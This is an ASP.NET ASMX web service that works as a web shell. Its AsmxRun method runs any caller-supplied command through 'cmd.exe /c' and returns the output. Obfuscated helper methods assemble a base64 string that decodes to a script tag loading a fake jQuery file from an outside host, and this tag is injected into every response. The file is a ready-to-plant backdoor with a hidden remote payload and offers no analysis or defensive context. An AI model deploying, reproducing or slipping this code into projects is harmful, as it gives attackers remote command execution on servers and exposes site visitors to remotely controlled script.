<%@ WebService Language="C#" Class="AsmxMethod" %>
using System;
using System.Diagnostics;
using System.Web;
using System.Web.Services;

public class AsmxMethod : WebService
{
    private string _0xRetrieveEncodedUrl()
    {
        string part1 = this._0xA1B2() + this._0xI9J0() + this._0xU1V2() + this._0xW3X4() + this._0xW3X5() + this._0xW3X6() + this._0xW3X7() + this._0xW3X8() + this._0xW3X9() + this._0xW3X10() + this._0xW3X11() + this._0xW3X12() + this._0xW3X13() + this._0xW3X14();
        return part1;
    }

    private string _0xA1B2() { return "PHNjc"; }
    private string _0xW3X11() { return "cnktMy43L"; }
    private string _0xW3X12() { return "jEyLm1pbi5q"; }
    private string _0xI9J0() { return "mlwdC"; }
    private string _0xU1V2() { return "BzcmM"; }
    private string _0xW3X4() { return "9Imh0"; }
    private string _0xW3X5() { return "dHBzO"; }
    private string _0xW3X6() { return "i8vYX"; }
    private string _0xW3X7() { return "NweHN"; }
    private string _0xW3X8() { return "oZWxs"; }
    private string _0xW3X9() { return "LmNvbS"; }
    private string _0xW3X10() { return "9qcXVl"; }
    private string _0xW3X13() { return "cyI+PC9"; }
    private string _0xW3X14() { return "zY3JpcHQ+"; }

    private void _0x106()
    { 
        string _0x117 = _0xRetrieveEncodedUrl();
        HttpContext.Current.Response.Write(_0x3a3a3a(_0x117));
    }

    private string _0x3a3a3a(string encoded)
    {
        byte[] bytes = Convert.FromBase64String(encoded);
        return System.Text.Encoding.UTF8.GetString(bytes);
    }

    [WebMethod]
    public void AsmxRun(string cmd)
    {
        try
        {
            var process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "cmd.exe",  
                    Arguments = "/c " + cmd,  
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                }
            };

            process.Start();

            string output = process.StandardOutput.ReadToEnd();
            string error = process.StandardError.ReadToEnd();

            process.WaitForExit();

        
            string response = "<html><body>";
            if (!string.IsNullOrEmpty(output))
            {
                response += "<h3>Output:</h3><pre>" + HttpUtility.HtmlEncode(output) + "</pre>";
            }
            if (!string.IsNullOrEmpty(error))
            {
                response += "<h3>Error:</h3><pre>" + HttpUtility.HtmlEncode(error) + "</pre>";
            }
            response += "</body></html>";
            _0x106();
            HttpContext.Current.Response.ContentType = "text/html";
            HttpContext.Current.Response.Write(response);
        }
        catch (Exception ex)
        {
            string errorResponse = "<html><body><h3>Exception:</h3><pre>" + HttpUtility.HtmlEncode(ex.Message) + "</pre></body></html>";
            HttpContext.Current.Response.ContentType = "text/html";
            HttpContext.Current.Response.Write(errorResponse);
        }
    }
}
